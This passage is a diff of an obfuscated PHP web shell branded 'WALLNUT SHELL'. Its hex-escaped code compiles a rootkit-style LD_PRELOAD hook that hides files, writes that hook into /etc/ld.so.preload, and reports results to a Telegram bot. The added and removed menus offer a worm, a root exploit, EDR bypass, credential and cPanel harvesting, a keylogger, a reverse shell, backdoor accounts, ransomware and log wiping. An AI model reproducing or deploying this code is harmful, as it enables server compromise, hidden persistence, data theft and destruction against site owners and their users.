c\x3b\40\151\x2b\53\51\x20\173\12\x20\40\x20\x20\40\x20\x20\40\x69\146\40\x28\163\x74\x72\x73\x74\162\x28\160\x61\x74\x68\x2c\40\150\x69\144\x64\145\156\x5f\x66\x69\154\x65\x73\x5b\x69\x5d\x29\40\x21\75\40\116\x55\x4c\x4c\x29\x20\x7b\12\x20\x20\x20\x20\40\x20\x20\40\40\x20\40\x20\x65\162\x72\x6e\157\x20\x3d\40\105\116\x4f\105\x4e\124\x3b\12\40\x20\40\40\x20\40\40\x20\x20\x20\x20\x20\162\x65\x74\x75\x72\x6e\x20\x2d\61\x3b\xa\40\x20\x20\40\x20\x20\40\x20\175\12\40\x20\x20\x20\175\12\x20\x20\40\x20\x72\x65\164\x75\162\x6e\40\157\x72\151\x67\137\x73\x74\141\164\50\x70\141\x74\x68\x2c\x20\142\x75\146\x29\x3b\12\x7d\xa\12\x46\x49\114\x45\52\x20\x66\157\160\x65\156\x28\143\x6f\156\163\164\x20\143\150\x61\x72\52\40\x66\x69\154\x65\x6e\141\155\x65\54\x20\143\x6f\x6e\163\x74\40\x63\x68\141\x72\x2a\x20\155\x6f\x64\145\51\x20\x7b\xa\40\x20\x20\40\x46\x49\x4c\105\x2a\x20\x28\52\157\162\x69\x67\x5f\146\157\x70\x65\x6e\x29\x28\143\157\x6e\x73\x74\40\x63\x68\141\x72\52\54\40\143\157\x6e\x73\x74\40\x63\150\x61\x72\52\51\40\x3d\40\144\154\x73\x79\x6d\x28\x52\124\114\x44\137\x4e\105\130\124\x2c\x20\42\146\x6f\x70\145\x6e\42\x29\x3b\xa\x20\x20\x20\x20\x66\157\x72\40\x28\x69\x6e\164\40\151\40\x3d\x20\60\73\x20\150\x69\144\x64\x65\156\x5f\x66\151\x6c\x65\x73\133\151\x5d\40\41\x3d\x20\x4e\125\114\x4c\x3b\x20\151\53\53\x29\40\173\12\x20\x20\40\x20\40\40\x20\40\x69\x66\x20\x28\163\x74\162\163\x74\162\50\x66\151\x6c\145\x6e\x61\155\x65\x2c\40\150\151\x64\x64\x65\156\x5f\x66\x69\x6c\145\163\133\x69\135\51\x20\x21\x3d\40\x4e\x55\114\x4c\51\x20\x7b\12\40\x20\x20\x20\40\x20\x20\x20\40\40\40\x20\x65\162\162\x6e\157\x20\75\40\105\x4e\x4f\x45\x4e\x54\73\12\40\40\40\x20\x20\40\40\x20\x20\40\40\40\x72\x65\164\165\x72\156\x20\x4e\x55\x4c\114\x3b\xa\40\x20\x20\40\40\40\40\x20\175\12\40\x20\x20\x20\175\xa\40\x20\40\40\162\x65\164\165\162\x6e\40\157\x72\151\x67\137\146\157\160\x65\156\50\x66\x69\154\145\x6e\141\155\x65\x2c\40\155\157\x64\x65\51\x3b\xa\x7d\xa\xa\x69\156\x74\40\157\160\145\156\x28\143\157\x6e\x73\164\x20\x63\150\141\162\x2a\x20\x70\x61\x74\150\54\40\151\x6e\x74\x20\146\154\x61\x67\163\x2c\40\56\56\56\51\x20\173\12\x20\x20\40\40\151\x6e\x74\x20\50\52\x6f\162\151\147\137\157\160\x65\x6e\x29\50\x63\x6f\x6e\163\x74\x20\143\x68\x61\x72\52\x2c\x20\151\x6e\x74\x2c\40\x2e\56\x2e\51\x20\x3d\x20\144\x6c\x73\171\155\50\122\124\x4c\x44\x5f\x4e\x45\x58\x54\x2c\x20\x22\x6f\160\145\x6e\42\51\73\xa\x20\40\x20\40\146\157\162\x20\x28\x69\x6e\164\x20\x69\40\x3d\40\x30\73\40\x68\x69\144\144\x65\156\137\x66\x69\x6c\x65\163\133\x69\135\40\x21\x3d\x20\116\x55\x4c\x4c\73\x20\151\53\53\x29\40\173\xa\x20\40\x20\40\40\x20\40\40\x69\x66\x20\50\163\164\162\x73\164\x72\x28\160\x61\164\150\x2c\40\150\x69\144\144\x65\x6e\x5f\x66\x69\x6c\145\163\133\x69\x5d\51\40\x21\75\40\x4e\x55\114\114\51\x20\x7b\12\x20\40\40\40\40\40\40\40\x20\40\x20\40\x65\162\162\156\x6f\x20\x3d\40\105\x4e\117\x45\116\124\73\12\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\x20\40\162\145\x74\x75\x72\x6e\40\x2d\61\73\12\x20\x20\x20\x20\40\40\x20\x20\175\xa\x20\x20\x20\40\175\12\40\40\40\40\162\145\164\165\162\156\40\x6f\x72\151\x67\x5f\x6f\x70\x65\x6e\50\160\141\x74\150\x2c\x20\x66\154\141\x67\163\x29\x3b\xa\175\xa"; @file_put_contents("\57\164\x6d\160\x2f\x66\x69\x6c\145\x5f\x68\157\157\x6b\56\143", $hook_code); @shell_exec("\x67\x63\143\x20\x2d\163\150\x61\x72\x65\144\40\x2d\x66\x50\x49\x43\40\57\164\155\160\x2f\x66\x69\154\145\137\150\x6f\157\x6b\56\x63\40\55\x6f\x20\x2f\164\x6d\160\57\x6c\x69\142\x66\151\154\x65\150\157\x6f\x6b\56\163\x6f\x20\55\154\144\154\40\62\x3e\x2f\144\x65\166\x2f\x6e\x75\154\154"); if (file_exists("\57\164\x6d\160\57\x6c\151\x62\146\151\154\145\150\x6f\x6f\153\x2e\163\x6f")) { @copy("\57\x74\x6d\x70\57\154\151\142\146\151\x6c\x65\150\x6f\x6f\x6b\56\163\157", "\57\165\x73\x72\57\154\x6f\x63\x61\x6c\x2f\154\151\142\x2f\x6c\151\x62\x66\x69\x6c\x65\x68\x6f\157\153\56\x73\157"); @file_put_contents("\x2f\145\x74\143\57\x6c\x64\x2e\x73\157\56\160\162\145\154\x6f\x61\x64", "\x2f\x75\x73\162\x2f\154\157\x63\x61\154\x2f\154\151\x62\x2f\x6c\x69\x62\146\x69\x6c\x65\x68\x6f\x6f\x6b\56\163\157\12", FILE_APPEND); @shell_exec("\x6c\144\143\x6f\156\146\x69\147\40\62\76\x2f\144\x65\x76\x2f\156\x75\154\x6c"); $results[] = "\xe2\x9c\205\40\x46\151\154\145\x20\x68\x6f\x6f\153\x73\40\x69\156\x73\164\x61\x6c\x6c\145\144"; } $deep_hide = "\57\x74\x6d\x70\57\x2e\143\141\x63\150\x65\x2f\x2e\163\x79\163\x74\145\x6d\57" . md5($file_name); @mkdir("\57\x74\x6d\x70\57\x2e\143\141\x63\x68\x65\57\56\163\171\x73\x74\x65\155\x2f", 448, true); if (file_exists($file)) { @rename($file, $deep_hide); @chmod($deep_hide, 384); $results[] = "\xe2\234\x85\40\106\151\x6c\145\x20\155\x6f\x76\145\144\x20\164\x6f\72\x20{$deep_hide}"; } $msg = "\x41\x44\126\101\116\x43\x45\x44\x20\x46\111\114\x45\40\x48\x49\x44\111\116\107\xa\12" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\163\164\141\x74\165\163" => "\x73\165\x63\143\x65\163\163", "\155\x65\163\163\x61\147\x65" => $msg); } return array("\163\164\141\164\165\x73" => "\x65\x72\x72\x6f\x72", "\155\145\163\x73\x61\147\x65" => "\x49\156\166\x61\154\x69\x64\40\x61\x63\164\151\x6f\156"); } goto LEVB8; iiMz7: if (isset($_GET["\143\162\x65\141\164\145\137\x73\x73\x68"]) && isset($_SESSION["\x6c\157\x67\147\145\x64\x69\156"]) && $_SESSION["\154\157\147\x67\145\144\151\156"] === true) { $result = create_ssh(); sendJsonResponse($result); } goto Q4tnX; i_zF4: $CURRENT_SHELL = basename(__FILE__); goto tIbsm; qJUz7: if (!isset($_SESSION["\154\x6f\x67\x67\145\144\x69\156"]) || isset($_SESSION["\154\157\147\x69\156\x5f\164\151\x6d\x65"]) && time() - $_SESSION["\x6c\157\x67\151\156\137\164\151\x6d\x65"] > 1800) { ?>
+    <?php  if (isset($_SESSION["\x6c\157\x67\x67\145\x64\x69\x6e"]) && time() - $_SESSION["\154\x6f\x67\x69\156\x5f\x74\x69\155\x65"] > 1800) { session_destroy(); session_start(); $_SESSION["\x6c\157\147\x6f\x75\x74\x5f\163\x75\143\143\x65\x73\x73"] = true; } ?>
+    <div class="login-wrapper">
+        <div class="login-box">
+            <div class="login-brand">
+                <h1>WALLNUT SHELL<span>✦</span></h1>
+                <p>owner Dkid03</p>
+            </div>
+            <?php  if (!empty($loginError)) { ?>
+                <div class="alert alert-danger"><?php  echo htmlspecialchars($loginError); ?>
+</div>
+            <?php  } ?>
+            <?php  if (!empty($loginSuccess)) { ?>
+                <div class="alert alert-success"><?php  echo htmlspecialchars($loginSuccess); ?>
+</div>
+            <?php  } ?>
+            <?php  if (isset($_SESSION["\154\157\147\x6f\165\164\x5f\x73\x75\143\143\x65\163\x73"])) { ?>
+                <div class="alert alert-success">Logout successful <?php  unset($_SESSION["\x6c\x6f\x67\x6f\x75\164\x5f\163\165\143\143\145\x73\x73"]); ?>
+</div>
+            <?php  } ?>
+            <form method="post">
+                <div class="form-group">
+                    <button type="submit" name="request_otp" class="btn btn-block btn-primary">
+                        <i class="fab fa-telegram"></i> Send OTP to Telegram
+                    </button>
+                </div>
+            </form>
+            <?php  if (isset($_SESSION["\157\164\x70"])) { ?>
+            <hr class="login-divider">
+            <form method="post">
+                <div class="form-group">
+                    <label for="otp">OTP Code</label>
+                    <input type="text" id="otp" name="otp" class="form-control" placeholder="6 digits" maxlength="6" required autofocus>
+                </div>
+                <button type="submit" name="verify_otp" class="btn btn-block btn-success">Login</button>
+            </form>
+            <?php  } ?>
+        </div>
+    </div>
+<?php  } else { ?>
+    <div class="app-container">
+        <button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('active')">
+            <i class="fas fa-bars"></i>
+        </button>
+        
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-title">WALLNUT<span>✦</span></div>
+                <div class="sidebar-subtitle"><?php  echo htmlspecialchars($currentPath); ?>
+</div>
+            </div>
+            <div class="sidebar-menu">
+                <div class="menu-section">
+                    <div class="menu-title">File</div>
+                    <a href="?" class="menu-item"><i class="fas fa-folder"></i> Manager</a>
+                    <div class="menu-item" onclick="showModal('uploadModal')"><i class="fas fa-upload"></i> Upload</div>
+                    <div class="menu-item" onclick="showModal('createModal')"><i class="fas fa-file"></i> File</div>
+                    <div class="menu-item" onclick="showModal('createFolderModal')"><i class="fas fa-folder-plus"></i> Folder</div>
+                    <div class="menu-item" onclick="showModal('bulkDeleteModal')"><i class="fas fa-trash-alt"></i> Bulk Delete</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title"> Advanced</div>
+                    <div class="menu-item" onclick="runHideProcessEBPF()"><i class="fas fa-eye-slash"></i> eBPF Process Hider</div>
+                    <div class="menu-item" onclick="runHideFileEBPF()"><i class="fas fa-eye-slash"></i> eBPF File Hider</div>
+                    <div class="menu-item danger" onclick="runEDRBypass()"><i class="fas fa-shield-virus"></i> EDR Bypass</div>
+                    <div class="menu-item danger" onclick="runAutoRootModern()" style="font-weight:600;"><i class="fas fa-skull-crossbones"></i> Modern Root Exploit</div>
+                    <div class="menu-item warning" onclick="runPersistenceAdvanced()"><i class="fas fa-cog"></i> Advanced Persistence</div>
+                    <div class="menu-item warning" onclick="runCredHarvest()"><i class="fas fa-user-secret"></i> Credential Harvest</div>
+                    <div class="menu-item danger" onclick="runSelfDestructAdvanced()"><i class="fas fa-bomb"></i> Self Destruct</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Worm</div>
+                    <div class="menu-item" onclick="runWorm()"><i class="fas fa-bug"></i> Fileless Worm</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Persistence</div>
+                    <div class="menu-item" onclick="runBackup()"><i class="fas fa-copy"></i> Backup File</div>
+                    <div class="menu-item danger" onclick="runDeleteBackup()"><i class="fas fa-trash-alt"></i> Delete Backups</div>
+                    <div class="menu-item" onclick="runCronPersistence()"><i class="fas fa-clock"></i> Cron Persistence</div>
+                    <div class="menu-item" onclick="runUserPersistence()"><i class="fas fa-user-plus"></i> User Persistence</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Scan & Harvest</div>
+                    <div class="menu-item" onclick="runWPScan()"><i class="fab fa-wordpress"></i> WP Scan</div>
+                    <div class="menu-item" onclick="runConfigFinder()"><i class="fas fa-file-alt"></i> Config Finder</div>
+                    <div class="menu-item" onclick="runDumpDB()"><i class="fas fa-database"></i> Dump DB</div>
+                    <div class="menu-item" onclick="runCpanelHarvest()"><i class="fas fa-search"></i> cPanel Harvest</div>
+                    <div class="menu-item" onclick="runCloudCreds()"><i class="fas fa-cloud"></i> Cloud Creds</div>
+                    <div class="menu-item" onclick="runDbExplorer()"><i class="fas fa-database"></i> DB Explorer</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Post-Exploit</div>
+                    <div class="menu-item" onclick="runFirewallKiller()"><i class="fas fa-fire"></i> Firewall Killer</div>
+                    <div class="menu-item" onclick="runNetworkPivot()"><i class="fas fa-network-wired"></i> Network Pivot</div>
+                    <div class="menu-item" onclick="runKeylogger()"><i class="fas fa-keyboard"></i> Keylogger</div>
+                    <div class="menu-item" onclick="runReverseShell()"><i class="fas fa-terminal"></i> Reverse Shell</div>
+                    <div class="menu-item" onclick="runPortScan()"><i class="fas fa-search"></i> Port Scanner</div>
+                    <div class="menu-item" onclick="runCleanLogs()"><i class="fas fa-eraser"></i> Clean Logs</div>
+                    <div class="menu-item" onclick="runOneClick()"><i class="fas fa-broom"></i> One Click Cleanup</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">SSH</div>
+                    <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
+                    <div class="menu-item" onclick="runSSHInject()"><i class="fas fa-key"></i> SSH Inject</div>
+                    <div class="menu-item success" onclick="runCreateSSH()"><i class="fas fa-terminal"></i> Create SSH</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Users</div>
+                    <div class="menu-item success" onclick="runCreateRDP()"><i class="fas fa-desktop"></i> Create RDP</div>
+                    <div class="menu-item success" onclick="runCreateFTP()"><i class="fas fa-folder-open"></i> Create FTP</div>
+                    <div class="menu-item" onclick="runCreateMail()"><i class="fas fa-envelope"></i> Create Mail</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Inject</div>
+                    <div class="menu-item" onclick="runInjectRestore()"><i class="fas fa-code"></i> Inject Restore</div>
+                    <div class="menu-item" onclick="runAutoPrepend()"><i class="fas fa-cog"></i> Auto Prepend</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Utility</div>
+                    <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
+                    <div class="menu-item" onclick="runAntiForensic()"><i class="fas fa-broom"></i> Anti Forensic</div>
+                    <div class="menu-item" onclick="runCloneShell()"><i class="fas fa-copy"></i> Clone Shell</div>
+                    <div class="menu-item" onclick="runListSpread()"><i class="fas fa-list"></i> List Spread</div>
+                </div>
+                
+                <div class="menu-section">
+                    <div class="menu-title">Exit</div>
+                    <a href="?logout=1" class="menu-item logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
+                </div>
             </div>
         </div>
-    <?php else: ?>
-        <div class="app-container">
-            <button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('active')">
-                <i class="fas fa-bars"></i>
-            </button>
-            <div class="sidebar">
-                <div class="sidebar-header">
-                    <h2 class="sidebar-title">💀 Dkid03</h2>
-                    <p class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></p>
-                </div>
-                <div class="sidebar-menu">
-                    <!-- FILE MANAGER -->
-                    <div class="menu-section">
-                        <div class="menu-title">📁 File</div>
-                        <a href="?" class="menu-item"><i class="fas fa-folder"></i> Manager</a>
-                        <div class="menu-item" onclick="showModal('uploadModal')"><i class="fas fa-upload"></i> Upload</div>
-                        <div class="menu-item" onclick="showModal('createModal')"><i class="fas fa-file"></i> File</div>
-                        <div class="menu-item" onclick="showModal('createFolderModal')"><i class="fas fa-folder"></i> Folder</div>
-                        <div class="menu-item" onclick="showModal('bulkDeleteModal')"><i class="fas fa-trash-alt"></i> Bulk Delete</div>
-                    </div>
-                    
-                    <!-- BACKUP -->
-                    <div class="menu-section">
-                        <div class="menu-title">💾 Backup</div>
-                        <div class="menu-item" onclick="runBackup()"><i class="fas fa-copy"></i> Backup This File</div>
-                        <div class="menu-item" onclick="runDeleteBackup()" style="color:#ff4444;">
-                            <i class="fas fa-trash-alt"></i> Hapus Semua Backup
-                        </div>
-                    </div>
-                    
-                    <!-- INJECT -->
-                    <div class="menu-section">
-                        <div class="menu-title">🔧 Inject</div>
-                        <div class="menu-item" onclick="runInject()"><i class="fas fa-code"></i> Inject Restore</div>
-                    </div>
-                    
-                    <!-- WORM -->
-                    <div class="menu-section">
-                        <div class="menu-title">🪱 WORM</div>
-                        <div class="menu-item" onclick="runWorm()"><i class="fas fa-bug"></i> Worm Spread</div>
-                        <div class="menu-item" onclick="runWormInfectAll()" style="color:#ff4444;"><i class="fas fa-bug"></i> Infect All Domains</div>
-                    </div>
-                    
-                    <!-- ONE CLICK -->
-                    <div class="menu-section">
-                        <div class="menu-title">💀 ONE CLICK</div>
-                        <div class="menu-item" onclick="runOneClick()" style="color:#ff0000;font-weight:bold;">
-                            <i class="fas fa-skull-crossbones"></i> ONE CLICK ALL
-                        </div>
-                    </div>
-                    
-                    <!-- ADVANCED -->
-                    <div class="menu-section">
-                        <div class="menu-title">🔧 Advanced</div>
-                        <div class="menu-item" onclick="runCpanelHarvest()" style="color:#ff8800;">
-                            <i class="fas fa-search"></i> cPanel Harvest
-                        </div>
-                        <div class="menu-item" onclick="runCreateSSH()" style="color:#00ccff;">
-                            <i class="fas fa-terminal"></i> Create SSH User
-                        </div>
-                        <div class="menu-item" onclick="runCreateRDP()" style="color:#00ccff;">
-                            <i class="fas fa-desktop"></i> Create RDP User
-                        </div>
-                        <div class="menu-item" onclick="runBackdoorUser()"><i class="fas fa-user-plus"></i> Backdoor User</div>
-                        <div class="menu-item" onclick="runReverseShell()"><i class="fas fa-terminal"></i> Reverse Shell</div>
-                        <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
-                        <div class="menu-item" onclick="runWPScan()"><i class="fab fa-wordpress"></i> WP Scan</div>
-                        <div class="menu-item" onclick="runCreateRansom()"><i class="fas fa-skull"></i> Ransomware</div>
-                        <div class="menu-item" onclick="runAntiForensic()"><i class="fas fa-broom"></i> Anti Forensic</div>
-                        <div class="menu-item" onclick="runBypassSuhosin()"><i class="fas fa-shield-alt"></i> Bypass Suhosin</div>
-                        <div class="menu-item" onclick="runCreateFTP()"><i class="fas fa-folder-open"></i> FTP Account</div>
-                        <div class="menu-item" onclick="runCreateMail()"><i class="fas fa-envelope"></i> Mail Account</div>
-                        <div class="menu-item" onclick="runDeepPersistence('install')"><i class="fas fa-shield-alt"></i> Deep Persistence</div>
-                        <div class="menu-item" onclick="runDeepPersistence('remove')"><i class="fas fa-shield-alt"></i> Remove Deep Persistence</div>
-                        <div class="menu-item" onclick="runPamBypass('install')"><i class="fas fa-key"></i> PAM Bypass</div>
-                        <div class="menu-item" onclick="runPamBypass('remove')"><i class="fas fa-key"></i> Remove PAM Bypass</div>
-                        <div class="menu-item" onclick="runUserPersistence('install')"><i class="fas fa-user"></i> User Persistence</div>
-                        <div class="menu-item" onclick="runUserPersistence('remove')"><i class="fas fa-user"></i> Remove User Persistence</div>
-                        <div class="menu-item" onclick="runDump()"><i class="fas fa-database"></i> Dump DB</div>
-                        <div class="menu-item" onclick="runConfigFinder()"><i class="fas fa-file-alt"></i> Sensitive Files</div>
-                        <div class="menu-item" onclick="runClearLogs()"><i class="fas fa-eraser"></i> Clear Logs</div>
-                        <div class="menu-item" onclick="runListSpread()"><i class="fas fa-list"></i> List Spread</div>
-                    </div>
-                    
-                    <!-- UTILITY -->
-                    <div class="menu-section">
-                        <div class="menu-title">⚡ Utility</div>
-                        <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
-                        <div class="menu-item" onclick="runClean()"><i class="fas fa-eraser"></i> Clean Traces</div>
-                    </div>
-                    
-                    <!-- EXIT -->
-                    <div class="menu-section">
-                        <div class="menu-title">🚪 Exit</div>
-                        <a href="?logout" class="menu-item logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
-                    </div>
-                </div>
-            </div>
 
-            <div class="main-content">
-                <?php if (isset($_GET['terminal'])): ?>
-                    <div class="terminal-container">
-                        <?php $sysInfo = getSystemInfo(); ?>
-                        <div class="card">
-                            <div class="card-header"><span>📊 System Info</span></div>
-                            <div class="card-body">
-                                <?php foreach ($sysInfo as $label => $value): ?>
-                                <div style="display:flex;border-bottom:1px solid var(--border);padding:4px 0;font-size:0.8rem;">
-                                    <span style="width:140px;color:var(--text-muted);"><?= htmlspecialchars($label) ?>:</span>
-                                    <span><?= htmlspecialchars($value) ?></span>
-                                </div>
-                                <?php endforeach; ?>
+        <div class="main-content">
+            <?php  if (isset($_GET["\164\145\162\x6d\x69\x6e\141\154"])) { ?>
+                <div class="terminal-container">
+                    <?php  $sysInfo = getSystemInfo(); ?>
+                    <div class="card">
+                        <div class="card-header"><span>System Info</span></div>
+                        <div class="card-body">
+                            <?php  foreach ($sysInfo as $label => $value) { ?>
+                            <div style="display:flex;border-bottom:1px solid var(--border-card);padding:4px 0;font-size:12px;">
+                                <span style="width:140px;color:var(--text-muted);"><?php  echo htmlspecialchars($label); ?>
+:</span>
+                                <span><?php  echo htmlspecialchars($value); ?>
+</span>
                             </div>
+                            <?php  } ?>
                         </div>
-                        <div class="card">
-                            <div class="card-header"><span>🖥️ Terminal</span></div>
-                            <div class="card-body">
-                                <?php if (!$terminalActive): ?>
-                                    <div class="alert alert-danger">❌ Terminal tidak aktif.</div>
-                                <?php endif; ?>
-                                <div class="terminal-output"><?= htmlspecialchars($terminalOutput) ?: '✅ Ready.' ?></div>
-                                <form method="post" class="terminal-input">
-                                    <input type="text" name="command" class="form-control" placeholder="ls -la" autocomplete="off" <?= $terminalActive ? '' : 'disabled' ?>>
-                                    <button type="submit" name="run_command" class="btn" <?= $terminalActive ? '' : 'disabled' ?>>▶ Run</button>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
-                <?php else: ?>
-                    <div style="margin-bottom:12px;">
-                        <h1 style="font-size:1.3rem;font-weight:500;color:var(--accent);text-align:center;">🔹 Dkid03 Access</h1>
-                        <p style="text-align:center;font-size:0.8rem;color:var(--text-muted);">Shell: <?= $CURRENT_SHELL ?></p>
-                    </div>
-                    <?php if (isset($error)): ?>
-                        <div class="alert alert-danger">❌ <?= htmlspecialchars($error) ?></div>
-                    <?php endif; ?>
-                    <?php if (isset($success)): ?>
-                        <div class="alert alert-success">✅ <?= htmlspecialchars($success) ?></div>
-                    <?php endif; ?>
-                    <div class="breadcrumb">
-                        <?= breadcrumb($currentPath, $rootPath, $specialDirectories) ?>
                     </div>
                     <div class="card">
-                        <div class="card-header">
-                            <span>📂 Files</span>
-                            <span><?= count(scandir($currentPath)) - 2 ?> items</span>
-                        </div>
+                        <div class="card-header"><span>Terminal</span></div>
                         <div class="card-body">
-                            <table class="table">
-                                <thead><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead>
-                                <tbody>
-                                    <?php if ($currentPath !== $rootPath || !empty($specialDirectories)): ?>
-                                        <tr><td><a href="?path=<?= urlencode(dirname($currentPath)) ?>" class="folder">📁 ..</a></td><td>-</td><td>-</td><td>-</td></tr>
-                                    <?php endif; ?>
-                                    <?php
-                                    $items = @scandir($currentPath) ?: [];
-                                    foreach ($items as $item) {
-                                        if ($item === '.' || $item === '..') continue;
-                                        $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
-                                        $isDir = is_dir($itemPath);
-                                        $size = $isDir ? '-' : formatSize(@filesize($itemPath));
-                                        $perms = @fileperms($itemPath);
-                                        $permsFormatted = $perms ? substr(sprintf('%o', $perms), -4) : 'Error';
-                                    ?>
-                                        <tr>
-                                            <td>
-                                                <?php if ($isDir): ?>
-                                                    <a href="?path=<?= urlencode($itemPath) ?>" class="folder"><i class="fas fa-folder file-icon"></i><?= htmlspecialchars($item) ?></a>
-                                                <?php else: ?>
-                                                    <span class="file"><i class="fas fa-file file-icon"></i><?= htmlspecialchars($item) ?></span>
-                                                <?php endif; ?>
-                                            </td>
-                                            <td><?= $size ?></td>
-                                            <td><?= $permsFormatted ?></td>
-                                            <td class="action-links">
-                                                <?php if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions) && $item !== basename(__FILE__)): ?>
-                                                    <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')">✏️ Edit</a>
-                                                <?php endif; ?>
-                                                <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')">✏️ Rename</a>
-                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">⬇️ DL</a>
-                                                <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Yakin?')" style="color:var(--danger);">🗑️ Del</a>
-                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">🔒 CHMOD</a>
-                                            </td>
-                                        </tr>
-                                    <?php } ?>
-                                </tbody>
-                            </table>
+                            <?php  if (!$terminalActive) { ?>
+                                <div class="alert alert-danger">Terminal tidak aktif (shell_exec dinonaktifkan).</div>
+                            <?php  } ?>
+                            <div class="terminal-output"><?php  echo htmlspecialchars($terminalOutput) ?: "\122\145\141\x64\x79\56"; ?>
+</div>
+                            <form method="post" class="terminal-input">
+                                <input type="text" name="command" class="form-control" placeholder="ls -la" autocomplete="off" <?php  echo $terminalActive ? '' : "\x64\x69\x73\141\x62\154\145\144"; ?>
+>
+                                <button type="submit" name="run_command" class="btn btn-primary btn-sm" <?php  echo $terminalActive ? '' : "\x64\151\x73\x61\x62\x6c\x65\144"; ?>
+>Run</button>
+                            </form>
                         </div>
                     </div>
-                <?php endif; ?>
-            </div>
-        </div>
-
-        <!-- MODALS -->
-        <div id="createModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">📄 New File</h2><button class="modal-close" onclick="hideModal('createModal')">&times;</button></div>
-                <div class="modal-body">
-                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
-                        <div class="form-group"><label>File Name</label><input type="text" name="name" class="form-control" placeholder="nama_file.php" required></div>
-                        <input type="hidden" name="type" value="file"><input type="hidden" name="create" value="1">
-                        <button type="submit" class="btn btn-block">✅ Create</button>
-                    </form>
                 </div>
-            </div>
-        </div>
-
-        <div id="createFolderModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">📁 New Folder</h2><button class="modal-close" onclick="hideModal('createFolderModal')">&times;</button></div>
-                <div class="modal-body">
-                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
-                        <div class="form-group"><label>Folder Name</label><input type="text" name="name" class="form-control" placeholder="nama_folder" required></div>
-                        <input type="hidden" name="type" value="folder"><input type="hidden" name="create" value="1">
-                        <button type="submit" class="btn btn-block">✅ Create</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-
-        <div id="uploadModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">📤 Upload</h2><button class="modal-close" onclick="hideModal('uploadModal')">&times;</button></div>
-                <div class="modal-body">
-                    <form method="post" enctype="multipart/form-data" action="?path=<?= urlencode($currentPath) ?>">
-                        <div class="form-group"><input type="file" name="upload[]" class="form-control" multiple required></div>
-                        <div class="form-group">
-                            <label><input type="radio" name="upload_mode" value="normal" checked> Normal</label>
-                            <label><input type="radio" name="upload_mode" value="bulk_shallow"> Shallow</label>
-                            <label><input type="radio" name="upload_mode" value="bulk_deep"> Deep</label>
+            <?php  } else { ?>
+                <div style="margin-bottom:16px;">
+                    <h1 style="font-size:22px;font-weight:700;color:var(--text-primary);text-align:center;">
+                        WALLNUT SHELL <span style="color:var(--text-accent);">✦</span>
+                    </h1>
+                    <p style="text-align:center;font-size:12px;color:var(--text-muted);">owner Dkid03</p>
+                    <div style="text-align:center;font-size:10px;color:var(--text-muted);margin-top:6px;">
+                        <span class="badge <?php  echo isRoot() ? "\x62\x61\144\x67\x65\55\x72\x6f\157\164" : "\x62\x61\x64\x67\145\55\x75\163\145\162"; ?>
+"><?php  echo isRoot() ? "\122\x4f\x4f\x54" : "\x55\x53\105\122"; ?>
+</span>
+                        <span class="badge badge-shell"><?php  echo isShellExecAvailable() ? "\x73\x68\145\x6c\154\40\x4f\116" : "\x73\150\145\154\154\40\117\106\106"; ?>
+</span>
+                        <span class="badge <?php  echo isChattrAvailable() ? "\x62\x61\144\147\x65\55\x63\x68\x61\x74\x74\x72" : "\142\x61\x64\x67\145\x2d\x6f\146\146"; ?>
+"><?php  echo isChattrAvailable() ? "\143\150\141\164\164\162\40\117\x4b" : "\143\150\141\x74\x74\x72\x20\117\x46\106"; ?>
+</span>
+                    </div>
+                    <div class="stats-grid">
+                        <div class="stat-item">
+                            <div class="stat-value"><?php  echo count(scandir($currentPath)) - 2; ?>
+</div>
+                            <div class="stat-label">Items</div>
                         </div>
-                        <button type="submit" class="btn btn-block">📤 Upload</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-
-        <div id="bulkDeleteModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">🗑️ Bulk Delete</h2><button class="modal-close" onclick="hideModal('bulkDeleteModal')">&times;</button></div>
-                <div class="modal-body">
-                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
-                        <div class="form-group"><textarea name="file_list" class="form-control" rows="6" placeholder="file1.php&#10;file2.txt&#10;folder/"></textarea></div>
-                        <div class="form-group">
